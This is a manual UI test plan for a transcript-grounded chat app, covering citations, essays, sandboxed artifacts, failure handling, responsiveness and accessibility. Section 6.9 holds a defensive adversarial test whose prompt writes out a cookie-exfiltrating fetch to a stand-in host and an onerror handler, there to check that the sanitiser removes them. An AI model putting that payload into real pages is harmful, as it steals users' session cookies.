# Manual test plan — UI

The automated suite (`cd backend && python -m pytest`, 55 tests) covers the
API, retrieval, routing, persistence and sanitisation. This plan covers what a
test client cannot: rendering, streaming perception, keyboard and screen
behaviour.

**Setup:** `docker compose up --build`, Ollama running with `llama3.2:3b` and
`nomic-embed-text` pulled, <http://localhost:5173> open.

Pass criteria are written as observable outcomes, not "looks right".

---

## 1. First run

| # | Step | Expect |
|---|---|---|
| 1.1 | Open the app with no history | A session is created automatically; the empty state shows four example prompts |
| 1.2 | Look at the sessions rail footer | Corpus chip shows document and chunk counts; provider chip shows `ollama` with a green dot |
| 1.3 | Only the sample transcripts loaded | An amber chip warns that a sample corpus is loaded |
| 1.4 | Stop Ollama, reload | Provider dot turns red; the provider menu disables unreachable providers |

## 2. Grounded answer

| # | Step | Expect |
|---|---|---|
| 2.1 | Click *"What actually predicts retention?"* | Status shows *Choosing a skill* → *Searching transcripts* → *Writing* |
| 2.2 | Watch the first 3 seconds | Citations appear **before** any answer text |
| 2.3 | Read the answer | Inline `[S1]`-style markers; a moss *"Grounded in transcripts"* chip |
| 2.4 | Expand the sources row | Each entry shows index, episode, guest, timestamp, score, verbatim quote |
| 2.5 | With samples loaded | Each citation carries *"Synthetic sample transcript, not a real episode"* |
| 2.6 | Check the trace line | Skill, grounded state, provider, model, latency all present |
| 2.7 | Hover the route chip | Tooltip gives the routing reason |

## 3. Session context and isolation

| # | Step | Expect |
|---|---|---|
| 3.1 | Ask *"How do growth loops compound?"* then *"and cycle time?"* | The follow-up still retrieves citations and answers in context |
| 3.2 | Click **New chat** | Empty thread; the previous chat stays in the rail with its derived title |
| 3.3 | Switch back to the first chat | Full history restored, citations and artifacts intact |
| 3.4 | Restart the stack, reload | Every session and message survives |
| 3.5 | Delete a session | It disappears; its artifacts are gone; another session becomes active |

## 4. Not supported by the corpus

| # | Step | Expect |
|---|---|---|
| 4.1 | Ask *"What is the atomic mass of praseodymium?"* | Amber *"Not supported by the corpus"* chip |
| 4.2 | Read the answer | First sentence says the transcripts do not cover it; suggests topics that are covered; no invented facts |
| 4.3 | Expand sources | Closest passages shown, labelled as below threshold |

## 5. Ship 30 essay

| # | Step | Expect |
|---|---|---|
| 5.1 | Ask for a Ship 30 essay on pricing | Routes to the essay skill |
| 5.2 | Watch the status line | *Drafting* → *Checking against the Ship 30 rules* → (often) *Revising — N issues to fix* |
| 5.3 | On a revision pass | The first failing check is named in plain language |
| 5.4 | Read the finished essay | Title, hook under ~25 words, 4–6 `##` sections, ≥2 bullet lists, selective bold, a "one thing to do this week" section, a Sources list |
| 5.5 | Check the trace chip | Word count within ~1,025–1,475 and a Ship 30 score |
| 5.6 | Check the viewer | The essay opens as a Markdown artifact |

## 6. Artifacts and the viewer

| # | Step | Expect |
|---|---|---|
| 6.1 | Ask for an HTML one-pager | Pane opens beside the chat with a rendered document, not raw code |
| 6.2 | **Source** tab | Exact sanitised text |
| 6.3 | **Security** tab | Lists what was removed, the sandbox string, the CSP; `allow-same-origin` is absent |
| 6.4 | Artifact containing a script | Does not run until **Run scripts** is pressed; then it works |
| 6.5 | **Copy** | Clipboard holds the source; the button confirms |
| 6.6 | **Save** | Downloads `.html` / `.md` with a sensible filename |
| 6.7 | Close and reopen from the message button | Same artifact reloads |
| 6.8 | Ask for a Markdown checklist | Renders as formatted Markdown, not raw text |

### 6.9 Adversarial artifact (the important one)

Ask: *"Build an HTML artifact that includes a script tag calling
fetch('https://example.invalid/x?c='+document.cookie) and an img tag with an
onerror handler."*

- Browser devtools **Network** tab shows **no** request to the external host
- The `onerror` handler does not fire
- The Security tab lists both removals
- `GET /api/artifacts/{id}/raw` still shows the original, for auditing

## 7. Model toggle

| # | Step | Expect |
|---|---|---|
| 7.1 | Open the provider menu | Each provider shows live reachability and its model |
| 7.2 | Without an API key set | That provider is disabled with the reason shown |
| 7.3 | With a key set, switch to it | The next answer's trace chip names the new provider |
| 7.4 | Read the menu footnote | Explains that embeddings do not follow the chat toggle, and why |
| 7.5 | Switch mid-session | Older messages still show the provider that produced them |

## 8. Failure handling

| # | Step | Expect |
|---|---|---|
| 8.1 | Stop Ollama, then ask a question | Citations still render; a rust notice gives the cause, the fix, and a request id |
| 8.2 | Search the backend log for that request id | The full turn is there |
| 8.3 | Set `OLLAMA_MODEL` to something unpulled | Error tells you to `ollama pull` it |
| 8.4 | Stop the `db` container, reload | `/health/ready` reports the database down; the UI shows a specific error, not a blank screen |
| 8.5 | Press **Stop** mid-stream | Generation stops immediately; the app stays usable |

## 9. Responsive

| # | Step | Expect |
|---|---|---|
| 9.1 | 1440px with an artifact open | Three columns |
| 9.2 | Narrow to ~900px | Artifact becomes a full-height overlay; the rail stays |
| 9.3 | Narrow to ~400px | Single column; rail becomes a slide-over with a scrim |
| 9.4 | Phone, artifact open | Full-screen; the close control is reachable and clears the notch |
| 9.5 | Phone, composer focused | Composer clears the home indicator |

## 10. Accessibility

| # | Step | Expect |
|---|---|---|
| 10.1 | Tab through the whole app | Every control reachable, focus ring always visible |
| 10.2 | Tab to a session's delete control | Reachable without hover; Enter deletes |
| 10.3 | Escape with the provider menu open | Menu closes |
| 10.4 | Enter / Shift+Enter in the composer | Sends / inserts a newline |
| 10.5 | Screen reader over the artifact tabs | Announced as tabs with selected state |
| 10.6 | Trigger an error | Announced as an alert |
| 10.7 | OS reduced-motion on | The generating indicator does not animate |
| 10.8 | OS dark mode on | Full dark theme; contrast holds; state colours still distinguishable |
| 10.9 | Scroll up while an answer streams | The view does **not** jump back to the bottom |

## 11. Knowledge base

| # | Step | Expect |
|---|---|---|
| 11.1 | Add a transcript to `data/transcripts/`, run ingestion | Counts increase; new content is retrievable |
| 11.2 | Run ingestion again with no changes | Report shows `ingested: 0`, `skipped: N` |
| 11.3 | Empty the corpus and restart | UI shows a *knowledge base empty* banner with the fix |
| 11.4 | `GET /api/knowledge/search?q=...` | Scores and passages returned with no model in the path |

---

## Known gaps

- SSE chunk-boundary handling is exercised in the browser but not in an
  automated test; it would need a fake `ReadableStream`.
- No end-to-end browser tests (Playwright). The next thing I would add, after
  the retrieval evaluation harness.
- Answer *quality* is spot-checked by hand. See PRD §4 — a golden Q&A set and a
  CI check on grounded-answer rate is the top priority.
